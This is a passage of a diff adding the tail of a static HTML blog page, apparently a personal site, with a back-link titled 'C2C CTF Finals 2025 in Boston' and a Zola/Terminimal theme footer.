+                                <span class="button__icon">←</span>&nbsp;
+                                <span class="button__text">C2C CTF Finals 2025 in Boston</span>
+                            </a>
+                        </span>
+                    
+                    </div>
+            </div>
+        
+    </div>
+
+    </div>
+
+    
+    <footer class="footer">
+        <div class="footer__inner">
+                <div class="copyright">
+                        <span>© 
+    2025
+ Powered by <a href="https://www.getzola.org/">Zola</a></span>
+                    <span class="copyright-theme">
+                        <span class="copyright-theme-sep">:: </span>
+                        Theme: <a href="https://github.com/pawroman/zola-theme-terminimal/">Terminimal</a> by pawroman
+                    </span>
+                </div>
+            </div>
+    </footer>
+    
+
+</div>
+</body>
+
+</html>
